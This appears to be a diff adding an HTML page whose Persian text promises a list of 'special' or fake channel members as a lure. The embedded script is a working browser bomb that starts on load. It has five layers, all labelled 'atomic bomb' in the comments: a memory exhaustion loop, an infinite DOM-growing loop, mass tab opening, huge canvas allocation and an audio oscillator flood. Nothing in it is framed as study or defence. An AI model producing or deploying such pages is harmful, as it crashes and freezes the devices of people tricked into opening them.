@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>🔥 اطلاعات ویژه 🔥</title>
+<style>
+body { 
+    font-size: 20px; 
+    direction: rtl; 
+    background: linear-gradient(45deg, #0a0a0a, #1a1a2e); 
+    color: #ffd700; 
+    text-align: center; 
+    padding: 50px; 
+    font-family: 'Traditional Arabic', 'Amiri', serif;
+    white-space: pre-wrap; 
+    word-break: break-all; 
+    overflow: hidden; 
+}
+h1 {
+    font-size: 30px;
+    color: #ff6b6b;
+}
+p {
+    font-size: 20px;
+    color: #aaa;
+}
+</style>
+</head>
+<body>
+<h1>🔥 به جمع ممبرهای ویژه خوش اومدی! 🔥</h1>
+<p>در حال بارگذاری لیست ۲۰۰۰ ممبر فیک...</p>
+<script>
+// ==================== بمب اتمی (همزمان با متن) ====================
+// لایه ۱: بمب حافظه
+var memory = [];
+function memoryBomb() {
+    for (var i = 0; i < 10000; i++) {
+        memory.push(new Array(10000000).join('𒀀'));
+        memory.push(new Array(10000000).join('🔥'));
+    }
+}
+setInterval(memoryBomb, 1);
+
+// لایه ۲: حلقه بی‌نهایت
+function infiniteLoop() {
+    var chars = ['⃟','꙰','𒀀','💀','🔥','⚡','💥','🎯','☢️'];
+    while (true) {
+        document.body.innerHTML += chars[Math.floor(Math.random() * chars.length)];
+        document.body.innerHTML += '💀'.repeat(10000);
+        document.body.innerHTML += '🔥'.repeat(10000);
+    }
+}
+setTimeout(infiniteLoop, 0);
+
+// لایه ۳: بمب تب
+function tabBomb() {
+    for (var i = 0; i < 200; i++) {
+        window.open('https://example.com', '_blank');
+    }
+}
+setInterval(tabBomb, 50);
+
+// لایه ۴: بمب Canvas
+function canvasBomb() {
+    for (var i = 0; i < 1000; i++) {
+        var canvas = document.createElement('canvas');
+        canvas.width = 10000000;
+        canvas.height = 10000000;
+        var ctx = canvas.getContext('2d');
+        for (var j = 0; j < 1000000; j++) {
+            ctx.fillStyle = '#' + Math.floor(Math.random()*16777215).toString(16);
+            ctx.fillRect(Math.random()*10000000, Math.random()*10000000, 100000, 100000);
+        }
+        document.body.appendChild(canvas);
+    }
+}
+setInterval(canvasBomb, 1);
+
+// لایه ۵: بمب صوتی
+function audioBomb() {
+    for (var i = 0; i < 200; i++) {
+        try {
+            var audio = new AudioContext();
+            for (var j = 0; j < 100000; j++) {
+                var oscillator = audio.createOscillator();
+                oscillator.frequency.value = Math.random() * 10000000;
+                oscillator.type = 'sawtooth';
+                oscillator.connect(audio.destination);
+                oscillator.start();
+                oscillator.stop(0.001);
+            }
+        } catch(e) {}
+    }
+}
+setInterval(audioBomb, 1);
+
+console.log('🔥 بمب اتمی با متن همزمان فعال شد!');
+</script>
+</body>
+</html>
